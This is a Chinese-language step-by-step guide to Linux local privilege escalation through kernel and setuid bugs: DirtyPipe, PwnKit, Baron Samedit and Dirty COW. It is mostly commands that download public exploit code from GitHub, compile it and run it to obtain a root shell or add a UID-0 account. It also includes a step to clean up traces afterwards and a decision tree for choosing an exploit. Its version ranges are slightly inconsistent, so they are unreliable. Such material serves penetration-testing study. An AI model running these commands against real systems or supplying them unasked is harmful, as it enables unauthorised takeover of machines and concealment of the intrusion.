## 理論基礎：核心提權的原理

| 漏洞 | CVE | 受影響版本 | 效果 |
|------|-----|----------|------|
| Dirty COW | CVE-2016-5195 | < 4.8.3（2016 前） | 寫入唯讀記憶體 → 修改 /etc/passwd |
| DirtyPipe | CVE-2022-0847 | 5.8 - 5.16.11 | 覆寫唯讀檔案 → 修改 /etc/passwd |
| PwnKit | CVE-2021-4034 | pkexec 任意版本 | pkexec 記憶體損壞 → root |
| Baron Samedit | CVE-2021-3156 | sudo < 1.9.5p2 | sudo heap overflow → root |
| OverlayFS | CVE-2023-0386 | < 6.2 | 容器外 SUID 提權 |

**核心漏洞風險**：可能造成系統不穩 / kernel panic / crash，在真實環境要謹慎使用。

## 步驟一：確認核心版本

```bash
uname -a
# 輸出：Linux hostname 5.4.0-74-generic #83-Ubuntu SMP...
# 重點：5.4.0-74-generic → 核心版本

uname -r
# 只顯示版本號：5.4.0-74-generic

cat /proc/version
# 詳細編譯資訊（含 gcc 版本）

# 發行版版本（配對補丁）
cat /etc/os-release
lsb_release -a 2>/dev/null
# 重要：Ubuntu 18.04 的 kernel 5.4 已 backport 許多 patch
# 版本號相同不代表漏洞相同 → 要看實際套件版本

# 查已安裝的核心套件版本（Debian/Ubuntu）
dpkg -l linux-image-* 2>/dev/null
# 或
apt-cache show linux-image-$(uname -r) 2>/dev/null | grep Version
```

## 工具：linux-exploit-suggester (LES)

```bash
# 上傳 LES 到目標並執行
./linux-exploit-suggester.sh
# 自動讀取 uname 輸出並比對已知 CVE
# 輸出格式：
# [+] [CVE-2022-0847] DirtyPipe
# State: highly probable (配置型條件已知)

# 或手動指定版本（不需在目標上執行）
./linux-exploit-suggester.sh --uname "Linux 5.4.0-74-generic #83-Ubuntu"
# --uname → 手動指定 uname 輸出字串

# 注意：LES 輸出要交叉驗證，很多 "probable" 實際上因 backport 不可用
```

## 方法一：searchsploit 找核心 exploit

```bash
# 基本搜尋（Kali）
searchsploit linux kernel 5.4
# 搜尋關鍵字：linux kernel + 版本號

# 更精確的搜尋
searchsploit linux local privilege escalation 2021
# 加年份縮小範圍

# 搜尋特定 CVE
searchsploit CVE-2022-0847
# 直接搜 CVE 編號

# 複製 exploit 到當前目錄
searchsploit -m linux/local/50808.c
# -m → mirror（複製到當前目錄）
# 50808.c → exploit 的編號

# 查看 exploit 詳情
searchsploit -x linux/local/50808.c
# -x → examine（直接在終端顯示）
```

## 方法二：DirtyPipe（CVE-2022-0847）

```bash
# 受影響版本：Linux kernel 5.8 - 5.16.11
# 原理：pipe 的 PIPE_BUF_FLAG_CAN_MERGE 旗標未初始化
# 可以覆寫任何唯讀的 page cache → 修改 /etc/passwd

# 確認是否受影響
uname -r
# 5.8 到 5.16.11 之間 → 可能受影響

# PoC 1：修改 /etc/passwd（直接版）
# 取得 PoC：https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits
gcc exploit.c -o exploit
# gcc → 編譯 C 程式
# -o exploit → 輸出可執行檔

./exploit /etc/passwd
# 修改 /etc/passwd 中 root 的密碼 hash（或添加 hacker 帳號）

# PoC 2：SUID shell 版本
./exploit /usr/bin/sudo
# 覆寫 SUID binary 為惡意版本

# 之後：
su -     # 若修改了 root 密碼
# 或
./shell  # 若生成了 SUID shell
```

## 方法三：PwnKit（CVE-2021-4034）

```bash
# 受影響：pkexec 任意版本（2021 年 11 月前未修補）
# 原理：pkexec 的 argc == 0 時 argv[0] 讀到 envp[0]
# 可控制環境變數 → 任意代碼執行

# 確認 pkexec 是否存在
which pkexec
ls -la $(which pkexec)
# 有 SUID 且 pkexec 存在 → 可能受影響

# 確認版本
pkexec --version
# 看是否已修補

# 利用（PoC）：https://github.com/berdav/CVE-2021-4034
git clone https://github.com/berdav/CVE-2021-4034.git
cd CVE-2021-4034
make
# 編譯 exploit

./cve-2021-4034
# 執行後直接得到 root shell
```

## 方法四：Baron Samedit（CVE-2021-3156，sudo heap overflow）

```bash
# 受影響：sudo 1.8.2 - 1.9.5p1（2021 年 1 月前）
# 原理：sudoedit 的 shell escape 序列沒有正確處理
# heap overflow → root

# 確認 sudo 版本
sudo --version
# 若 1.8.2 到 1.9.5p1 → 可能受影響

# 快速測試是否存在漏洞
sudoedit -s '\' $(python3 -c 'print("A"*65536)')
# 若輸出 "malloc(): corrupted" 或 segfault → 存在漏洞
# 若輸出 "usage:" → 已修補

# 利用（PoC）：
# https://github.com/blasty/CVE-2021-3156
make
./sudo-hax-me-a-sandwich 0
# 選擇目標系統（0 = Ubuntu 18.04 / sudo 1.8.21）
# 成功後得到 root shell
```

## 方法五：Dirty COW（CVE-2016-5195，老系統）

```bash
# 受影響：Linux kernel < 4.8.3（2016 年 10 月前）
# 原理：copy-on-write 競態條件 → 寫入唯讀記憶體映射
# 可修改 /etc/passwd

# 確認核心版本
uname -r
# < 4.8 → 可能受影響（注意：許多發行版已 backport 修補）

# 利用方式（修改 /etc/passwd）：
# 下載 PoC
wget https://raw.githubusercontent.com/FireFart/dirtycow/master/dirty.c
gcc -pthread dirty.c -o dirty -lcrypt
# -pthread → 連結 pthread 函式庫（競態條件需要多執行緒）
# -lcrypt  → 連結 crypt 函式庫（生成密碼 hash）

./dirty
# 輸出：提示輸入新密碼
# 修改 /etc/passwd，加入 firefart 帳號（UID=0）

su firefart
# 使用新建立的 root 帳號登入

# 恢復 /etc/passwd（清理痕跡）
cp /tmp/passwd.bak /etc/passwd
```

## 判斷邏輯

```
uname -r 看核心版本

LES / searchsploit 比對：

有 PwnKit (pkexec) 且版本未修補？
└── 最穩定，幾乎全版本影響 → CVE-2021-4034

核心 5.8-5.16.11？
└── DirtyPipe → CVE-2022-0847（直接覆寫 /etc/passwd）

sudo < 1.9.5p1？
└── Baron Samedit → CVE-2021-3156

核心 < 4.8（老系統）？
└── Dirty COW → CVE-2016-5195

都不確定？
└── 先走 sudo/SUID/cron 等配置型路徑
    確定沒路了再來 kernel
```
